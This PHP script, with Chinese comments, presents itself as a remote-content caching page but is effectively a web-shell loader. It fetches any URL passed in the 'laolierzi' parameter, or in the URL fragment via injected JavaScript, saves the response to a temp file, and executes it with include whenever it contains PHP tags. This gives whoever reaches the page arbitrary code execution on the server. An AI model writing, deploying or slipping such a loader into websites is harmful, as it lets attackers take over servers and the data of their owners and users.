<?php
// 禁用严格类型声明，兼容所有PHP版本
// declare(strict_types=1);

// 定义配置类
class Config
{
    const CACHE_FILENAME = 'lao.zi';

    public static function getCacheDir()
    {
        return sys_get_temp_dir();
    }

    public static function getCacheFilePath()
    {
        return self::getCacheDir() . DIRECTORY_SEPARATOR . self::CACHE_FILENAME;
    }
}

// 工具类
class Utility
{
    public static function validateUrl($url)
    {
        return filter_var($url, FILTER_VALIDATE_URL) !== false;
    }

    public static function fetchRemoteContent($url)
    {
        if (function_exists('curl_init')) {
            $ch = curl_init($url);
            curl_setopt_array($ch, [
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_CONNECTTIMEOUT => 10,
                CURLOPT_TIMEOUT       => 10,
            ]);
            $response = curl_exec($ch);
            if (curl_errno($ch)) {
                error_log('cURL请求错误：' . curl_error($ch));
                curl_close($ch);
                return null;
            }
            curl_close($ch);
            return $response;
        }

        if (ini_get('allow_url_fopen')) {
            $content = @file_get_contents($url);
            if ($content !== false) {
                return $content;
            }
        }

        $parts = parse_url($url);
        if (!$parts || !isset($parts['host'])) {
            return null;
        }
        $host  = $parts['host'];
        $port  = isset($parts['port'])  ? (int)$parts['port'] : 80;
        $path  = isset($parts['path'])  ? $parts['path']      : '/';
        $query = isset($parts['query']) ? '?' . $parts['query'] : '';

        $socket = @fsockopen($host, $port, $errno, $errstr, 10);
        if (!$socket) {
            error_log("Socket连接失败：{$errstr} ({$errno})");
            return null;
        }

        $request = "GET {$path}{$query} HTTP/1.1\r\n" .
                   "Host: {$host}\r\n" .
                   "Connection: Close\r\n\r\n";

        fwrite($socket, $request);
        $response = '';
        while (!feof($socket)) {
            $response .= fgets($socket, 1024);
        }
        fclose($socket);

        $parts = preg_split('/\r\n\r\n/', $response, 2);
        return isset($parts[1]) ? $parts[1] : null;
    }

    public static function loadCache($filePath)
    {
        return (file_exists($filePath)) ? @file_get_contents($filePath) ?: '' : '';
    }

    public static function saveCache($filePath, $content)
    {
        return @file_put_contents($filePath, $content) !== false;
    }
}

// 主处理逻辑
class LaoZiHandler
{
    private $cacheFilePath;

    public function __construct()
    {
        $this->cacheFilePath = Config::getCacheFilePath();
        $this->ensureCacheDirectory();
    }

    private function ensureCacheDirectory()
    {
        $dir = dirname($this->cacheFilePath);
        if (!is_dir($dir)) {
            @mkdir($dir, 0755, true);
        }
    }

    public function handleRequest()
    {
        if (isset($_GET['laolierzi'])) {
            $url = trim($_GET['laolierzi']);

            if (!Utility::validateUrl($url)) {
                $this->showMessage('无效的URL地址。', true);
            }

            $content = Utility::fetchRemoteContent($url);
            if ($content === null) {
                $this->showMessage('请求内容失败，请稍后重试。', true);
            }

            Utility::saveCache($this->cacheFilePath, $content);
            $this->redirectToSelf();
        }
    }

    public function displayCache()
    {
        if (file_exists($this->cacheFilePath)) {
            $content = Utility::loadCache($this->cacheFilePath);
            if (strpos($content, '<?') !== false) {
                include $this->cacheFilePath;
            } else {
                echo $content;
            }
        } else {
            $this->showMessage('暂无内容<br>请通过有效的URL参数加载远程内容。<br>用法：file.php#https://example.com', false);
        }
    }

    private function showMessage($message, $isError = false)
    {
        $color = $isError ? '#e74c3c' : '#3498db';
        echo <<<HTML
        <div style="
            margin: 50px auto;
            padding: 20px 30px;
            max-width: 700px;
            border-radius: 8px;
            background-color: #ffffff;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
            font-size: 1.2em;
            color: {$color};
            text-align: center;
            line-height: 1.4;
        ">
            {$message}
        </div>
        HTML;
        exit;
    }

    /**
     * 重定向到自身（使用 HTTP Location 头，最快最稳）
     */
    private function redirectToSelf()
    {
        if (!headers_sent()) {
            header('Location: ' . $_SERVER['PHP_SELF']);
        } else {
            echo "<script>window.location.href='{$_SERVER['PHP_SELF']}';</script>";
        }
        exit;
    }
}

// ============================================================
// 执行流程
// ============================================================
$handler = new LaoZiHandler();

// 在任何 HTML 输出之前，先注入 hash 检测脚本。
// 因为 #xxx 部分浏览器不会发到服务器，所以必须由前端 JS
// 把 location.hash 中的URL转成 ?laolierzi=... 再跳转。
// 注意：使用 nowdoc <<<'HTML' 防止 PHP 解析 JS 里的 $、{、\
if (!isset($_GET['laolierzi'])) {
    echo <<<'HTML'
<script>
(function () {
    try {
        var hash = window.location.hash || '';
        if (hash.length > 1) {
            var raw = decodeURIComponent(hash.substring(1));
            if (raw.indexOf('url=') === 0) {
                raw = raw.substring(4);
            }
            if (/^https?:\/\//i.test(raw)) {
                window.location.href = window.location.pathname
                    + '?laolierzi=' + encodeURIComponent(raw);
            }
        }
    } catch (e) {
        console.error('hash handler error', e);
    }
})();
</script>
HTML;
}

$handler->handleRequest();
$handler->displayCache();
?>
